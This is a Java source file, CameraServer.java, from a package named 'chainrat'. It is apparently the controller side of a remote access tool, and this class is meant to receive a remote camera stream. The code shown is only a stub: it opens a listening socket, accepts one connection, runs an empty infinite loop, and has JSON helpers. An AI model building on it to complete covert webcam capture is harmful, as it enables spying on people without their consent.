package com.nefi.chainrat.server.network;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.nefi.chainrat.server.Main;
import com.nefi.chainrat.server.forms.frmMainController;
import com.nefi.chainrat.server.log.Log;
import javafx.application.Platform;

import java.lang.reflect.Type;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class CameraServer implements Runnable {
    private Socket socket;
    private int port;
    private Log log;


    @Override
    public void run() {
        this.log = Main.getLog();
        this.port = Main.getPort();
        open();
        handleCamera();
    }

    private void open() {
        log.d(this, "Starting Camera Server...");
        try (ServerSocket listener = new ServerSocket(this.port)) {
            this.socket = listener.accept();
        }catch (Exception ex){
            log.d(this, "Error starting Server! Try again...");
            ex.printStackTrace();
            open();
        }
        log.d(this, "Camera Server started");
    }

    private void handleCamera(){
        while (true){
        }
    }

    private Object fromJson(String json, Type type){
        try {
            Object obj;
            GsonBuilder gsb = new GsonBuilder();
            Gson gson = gsb.create();
            obj = gson.fromJson(json, type);
            return obj;
        }catch (Exception ex){
            log.d(this, "Serialization FAILED!: " + ex.getMessage());
            return null;
        }

    }

    private String toJson(Object obj, Type type){
        log.d(this, "Starting JSON Serialization...");
        String out;
        try {
            GsonBuilder gsb = new GsonBuilder();
            Gson gson = gsb.create();
            out = gson.toJson(obj, type);
            return out;
        }catch (Exception ex){
            log.d(this, "Serialization FAILED!: " + ex.getMessage());
            return null;
        }
    }
}
